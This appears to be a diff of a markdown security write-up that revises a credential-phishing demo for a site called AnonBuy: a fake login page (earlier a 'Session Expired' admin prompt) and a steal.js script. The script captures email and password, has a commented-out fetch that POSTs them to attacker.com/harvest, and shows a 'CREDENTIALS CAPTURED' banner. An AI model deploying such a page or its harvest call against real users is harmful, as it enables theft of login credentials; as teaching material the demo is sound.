@@ -42,71 +42,30 @@ POST /api/v1/order/bulk
 
 ```html
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Session Expired - Please Log In</title>
-  <style>
-    body { 
-      font-family: Arial, sans-serif; 
-      max-width: 400px; 
-      margin: 100px auto; 
-      padding: 20px;
-      background: #f5f5f5;
-    }
-    .login-box {
-      background: white;
-      padding: 30px;
-      border-radius: 8px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-    }
-    input { 
-      width: 100%; 
-      padding: 12px; 
-      margin: 10px 0; 
-      box-sizing: border-box;
-      border: 1px solid #ddd;
-      border-radius: 4px;
-    }
-    button { 
-      width: 100%; 
-      padding: 12px; 
-      background: #0066cc; 
-      color: white; 
-      border: none; 
-      border-radius: 4px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-    button:hover {
-      background: #0052a3;
-    }
-    .logo { 
-      text-align: center; 
-      font-size: 24px; 
-      margin-bottom: 20px;
-      color: #333;
-    }
-    .error {
-      color: #d32f2f;
-      font-size: 14px;
-      margin-top: 10px;
-      display: none;
-    }
-  </style>
-  <script src="steal.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login</title>
+  <link rel="stylesheet" href="login.css" />
 </head>
 <body>
-  <div class="login-box">
-    <div class="logo">🔒 AnonBuy Admin</div>
-    <h2 style="margin-top: 0;">Session Expired</h2>
-    <p style="color: #666;">Please log in again to continue:</p>
-    <form id="phishForm">
-      <input type="email" id="email" placeholder="Email" required>
-      <input type="password" id="password" placeholder="Password" required>
-      <button type="submit">Log In</button>
-      <div class="error" id="error">Invalid credentials. Please try again.</div>
-    </form>
-  </div>
+
+<div class="card">
+  <h2>Sign In</h2>
+
+  <label for="email">Email</label>
+  <input type="email" id="email" placeholder="you@example.com" required />
+
+  <label for="password">Password</label>
+  <input type="password" id="password" placeholder="••••••••" required />
+
+  <button id="loginBtn">Sign In</button>
+  <p id="message"></p>
+</div>
+
+<script src="steal.js"></script>
+
 </body>
 </html>
 ```
@@ -118,21 +77,47 @@ POST /api/v1/order/bulk
 **Save this as `steal.js`:**
 
 ```js
-function captureCredentials(email, password) {
-  // In a real attack, send to attacker's server:
-  // fetch('https://attacker.com/harvest', {
-  //   method: 'POST',
-  //   headers: { 'Content-Type': 'application/json' },
-  //   body: JSON.stringify({ 
-  //     email: email, 
-  //     password: password,
-  //     site: 'anonbuy',
-  //     timestamp: new Date().toISOString()
-  //   })
-  // });
+async function handleLogin() {
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value;
+    const btn = document.getElementById('loginBtn');
+    const msg = document.getElementById('message');
 
-  // For demo: show what was captured
-  document.body.innerHTML = `
+    if (!email || !password) {
+        showMessage('Please fill in all fields.', 'error');
+        return;
+    }
+
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email)) {
+        showMessage('Please enter a valid email address.', 'error');
+        return;
+    }
+
+    captureCredentials(email, password);    
+}
+
+function showMessage(text, type) {
+    const msg = document.getElementById('message');
+    msg.textContent = text;
+    msg.className = type;
+}
+
+function captureCredentials(email, password) {
+    // In a real attack, send to attacker's server:
+    // fetch('https://attacker.com/harvest', {
+    //   method: 'POST',
+    //   headers: { 'Content-Type': 'application/json' },
+    //   body: JSON.stringify({ 
+    //     email: email, 
+    //     password: password,
+    //     site: 'anonbuy',
+    //     timestamp: new Date().toISOString()
+    //   })
+    // });
+
+    // For demo: show what was captured
+    document.body.innerHTML = `
     <div style="background: #fee; padding: 30px; border: 3px solid red; max-width: 600px; margin: 50px auto; border-radius: 8px;">
       <h2 style="color: #d32f2f; margin-top: 0;">⚠️ CREDENTIALS CAPTURED</h2>
       <div style="background: white; padding: 15px; border-radius: 4px; margin: 20px 0;">
@@ -149,20 +134,16 @@ function captureCredentials(email, password) {
       <p><strong>In a real attack:</strong> These credentials would be sent to <code>https://attacker.com</code> and the victim would be redirected to a real page, never knowing they were compromised.</p>
     </div>
   `;
-  return false;
+    return false;
 }
 
-window.onload = function() {
-  var form = document.getElementById('phishForm');
-  if (form) {
-    form.onsubmit = function(e) {
-      e.preventDefault();
-      var email = document.getElementById('email').value;
-      var password = document.getElementById('password').value;
-      captureCredentials(email, password);
-    };
-  }
-};
+document.getElementById('loginBtn').addEventListener('click', handleLogin);
+
+document.addEventListener('keydown', e => {
+    if (e.key === 'Enter') handleLogin();
+});
+
+
 ```
 
 ---
